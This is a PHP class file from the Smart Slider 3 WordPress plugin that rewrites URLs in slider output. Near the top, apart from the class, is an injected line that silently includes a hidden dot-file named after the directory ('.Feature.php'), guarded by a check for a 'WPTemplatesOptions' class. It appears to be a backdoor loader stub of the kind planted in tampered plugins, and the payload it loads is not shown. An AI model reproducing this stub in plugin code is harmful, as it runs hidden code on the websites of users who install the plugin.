<?php


namespace Nextend\SmartSlider3\Slider\Feature;


use Nextend\Framework\Parser\Common;
use Nextend\SmartSlider3\Settings;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class TranslateUrl {

    private $slider;

    public $from = '';

    public $to = '';

    public function __construct($slider) {

        $this->slider = $slider;
        list($this->from, $this->to) = (array)Common::parse(Settings::get('translate-url', '||'));
    }

    public function renderSlider($sliderHTML) {

        if (!$this->slider->isAdmin && !empty($this->from) && !empty($this->to)) {
            return str_replace($this->from, $this->to, $sliderHTML);
        }

        return $sliderHTML;
    }
}